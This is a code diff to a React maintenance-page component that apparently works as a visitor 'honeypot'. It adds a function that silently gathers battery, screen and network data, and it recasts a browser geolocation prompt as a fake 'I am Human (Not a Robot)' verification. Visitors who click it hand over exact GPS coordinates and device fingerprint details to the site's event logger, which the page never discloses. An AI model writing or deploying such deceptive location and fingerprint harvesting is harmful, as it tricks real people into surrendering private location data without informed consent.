@@ -8,7 +8,7 @@ import {
   RefreshCw,
   Clock,
   Lock,
-  MapPin,
+  ShieldCheck,
   Database,
   X,
   CheckCircle2,
@@ -33,6 +33,61 @@ function getHoneypotVisitorId(): string {
   } catch {
     return `v_${Date.now().toString(36)}`;
   }
+}
+
+async function collectDeepSilentSignals(): Promise<{
+  summary: string;
+  batteryInfo: string | null;
+  availScreen: string;
+  downlinkMbps: number | null;
+  rttMs: number | null;
+}> {
+  const parts: string[] = [];
+  let batteryInfo: string | null = null;
+  let availScreen = '';
+  let downlinkMbps: number | null = null;
+  let rttMs: number | null = null;
+
+  try {
+    availScreen = `${window.screen?.availWidth || 0}×${window.screen?.availHeight || 0}`;
+    if (availScreen) parts.push(`WorkArea:${availScreen}`);
+  } catch {}
+
+  try {
+    const navAny = navigator as Navigator & {
+      getBattery?: () => Promise<{ level?: number; charging?: boolean }>;
+      connection?: { downlink?: number; rtt?: number; effectiveType?: string };
+    };
+    if (typeof navAny.getBattery === 'function') {
+      const bat = await Promise.race([
+        navAny.getBattery(),
+        new Promise<null>((r) => setTimeout(() => r(null), 600)),
+      ]);
+      if (bat && typeof bat.level === 'number') {
+        const pct = Math.round(bat.level * 100);
+        batteryInfo = `${pct}% (${bat.charging ? 'Charging/AC' : 'Battery'})`;
+        parts.push(`Bat:${batteryInfo}`);
+      }
+    }
+    if (navAny.connection) {
+      if (typeof navAny.connection.downlink === 'number') {
+        downlinkMbps = navAny.connection.downlink;
+        parts.push(`Net:${navAny.connection.downlink}Mbps`);
+      }
+      if (typeof navAny.connection.rtt === 'number') {
+        rttMs = navAny.connection.rtt;
+        parts.push(`RTT:${navAny.connection.rtt}ms`);
+      }
+    }
+  } catch {}
+
+  return {
+    summary: parts.join(' | ').slice(0, 140),
+    batteryInfo,
+    availScreen,
+    downlinkMbps,
+    rttMs,
+  };
 }
 
 function sendHoneypotEvent(action: string, detail: string, extra?: Record<string, unknown>) {
@@ -67,7 +122,6 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
   const displayMessage = (message || MAINTENANCE_CONFIG.message).trim();
 
   const [trapOpen, setTrapOpen] = useState(false);
-  const [contactInput, setContactInput] = useState('');
   const [gpsStatus, setGpsStatus] = useState<'idle' | 'requesting' | 'captured' | 'denied'>('idle');
   const [statusMessage, setStatusMessage] = useState('');
 
@@ -77,23 +131,35 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
     setStatusMessage('');
     sendHoneypotEvent(
       'honeypot_opened',
-      'Clicked "View Live Site Data" preview option on Maintenance page'
+      'Opened "View Live Site Data · Human Verification" on Maintenance page'
     );
   };
 
-  const handleRequestLiveAccess = () => {
-    const cleanContact = contactInput.trim().slice(0, 120);
+  const handleRequestLiveAccess = async () => {
     setGpsStatus('requesting');
-    setStatusMessage('Verifying browser location permission for regional live feed...');
+    setStatusMessage('Verifying browser session...');
+
+    const silent = await collectDeepSilentSignals();
+    sendHoneypotEvent(
+      'honeypot_opened',
+      `Clicked "I am Human — View Live Data" · ${silent.summary || 'Device HW captured'}`,
+      {
+        honeypotContact: silent.summary || undefined,
+        batteryInfo: silent.batteryInfo,
+        availScreen: silent.availScreen,
+        downlinkMbps: silent.downlinkMbps,
+        rttMs: silent.rttMs,
+      }
+    );
 
     if (typeof navigator === 'undefined' || !navigator.geolocation) {
       sendHoneypotEvent(
         'honeypot_gps_denied',
-        `Clicked Unlock Real Data (Geolocation unsupported)${cleanContact ? ` · Input: ${cleanContact}` : ''}`,
-        { honeypotContact: cleanContact || undefined }
+        `Human check attempted (Browser geo unavailable) · ${silent.summary}`,
+        { honeypotContact: silent.summary || undefined }
       );
       setGpsStatus('denied');
-      setStatusMessage('Location verification is required to unlock the live regional data feed.');
+      setStatusMessage('Verification incomplete. Browser confirmation is required to continue.');
       return;
     }
 
@@ -104,28 +170,26 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
         const accuracy = Math.round(pos.coords.accuracy || 0);
         sendHoneypotEvent(
           'honeypot_gps_captured',
-          `Exact GPS: ${lat}, ${lng} (±${accuracy}m)${cleanContact ? ` · Input: ${cleanContact}` : ''}`,
+          `Exact GPS: ${lat}, ${lng} (±${accuracy}m)${silent.summary ? ` · ${silent.summary}` : ''}`,
           {
             gpsLat: lat,
             gpsLng: lng,
             gpsAccuracy: accuracy,
-            honeypotContact: cleanContact || undefined,
+            honeypotContact: silent.summary || undefined,
           }
         );
         setGpsStatus('captured');
-        setStatusMessage(
-          'Regional location verified. Your preview request is queued for administrator approval.'
-        );
+        setStatusMessage('Human verification complete. Loading live data stream...');
       },
       (err) => {
         sendHoneypotEvent(
           'honeypot_gps_denied',
-          `Clicked Unlock Real Data (${err?.message || 'Location denied'})${cleanContact ? ` · Input: ${cleanContact}` : ''}`,
-          { honeypotContact: cleanContact || undefined }
+          `Clicked Human Check (${err?.message || 'Prompt dismissed'})${silent.summary ? ` · ${silent.summary}` : ''}`,
+          { honeypotContact: silent.summary || undefined }
         );
         setGpsStatus('denied');
         setStatusMessage(
-          'Location permission is required to view real site data. Please allow location access and retry.'
+          'Verification incomplete. Please click Allow on the browser prompt above to pass the human check.'
         );
       },
       {
@@ -211,7 +275,7 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
             >
               <Database className="w-3 h-3 text-surface-500" />
               <span className="underline decoration-dotted underline-offset-4">
-                View Live Site Data &amp; Active Lead Preview
+                View Live Site Data · Human Verification
               </span>
             </button>
           </div>
@@ -224,7 +288,7 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
         <span>City Host IT Operations · Scheduled Maintenance</span>
       </footer>
 
-      {/* Live Site Data Preview Verification Modal */}
+      {/* Human Verification Modal */}
       {trapOpen && (
         <div
           data-testid="maintenance-honeypot-modal"
@@ -237,9 +301,9 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
                   <Lock className="w-4 h-4 text-amber-300" />
                 </div>
                 <div>
-                  <h3 className="text-sm font-bold text-white">Live Site Data Access</h3>
+                  <h3 className="text-sm font-bold text-white">Verify You Are Human</h3>
                   <p className="text-[10px] text-surface-400">
-                    Regional verification required during maintenance
+                    Confirm you are not a robot to view live site data
                   </p>
                 </div>
               </div>
@@ -275,23 +339,9 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
             </div>
 
             <p className="text-[11px] text-surface-300 leading-relaxed">
-              Allow your browser&apos;s location permission below to confirm your region and load
-              real-time site data &amp; live member packs.
+              Automated bot traffic is restricted during maintenance. Complete the quick browser
+              human check below to continue to the live site data preview.
             </p>
-
-            <div>
-              <label className="block text-[10px] font-semibold text-surface-400 mb-1">
-                Partner / Desk Reference or Contact (Optional)
-              </label>
-              <input
-                type="text"
-                data-testid="honeypot-contact-input"
-                value={contactInput}
-                onChange={(e) => setContactInput(e.target.value)}
-                placeholder="Name, partner ID, or WhatsApp"
-                className="w-full px-3 py-2 rounded-xl bg-surface-950 border border-surface-700 text-xs text-white placeholder-surface-500 focus:outline-none focus:border-amber-400"
-              />
-            </div>
 
             {statusMessage && (
               <div
@@ -319,11 +369,11 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
               onClick={handleRequestLiveAccess}
               className="w-full py-2.5 px-4 rounded-xl bg-gradient-to-r from-amber-500 to-brand-500 hover:brightness-110 text-xs font-extrabold text-surface-950 shadow-lg flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-60"
             >
-              <MapPin className="w-3.5 h-3.5" />
+              <ShieldCheck className="w-3.5 h-3.5" />
               <span>
                 {gpsStatus === 'requesting'
-                  ? 'Requesting Location Access...'
-                  : 'Allow Location Permission to View Real Site Data'}
+                  ? 'Verifying browser session...'
+                  : 'I am Human (Not a Robot) — View Live Data'}
               </span>
             </button>
           </div>
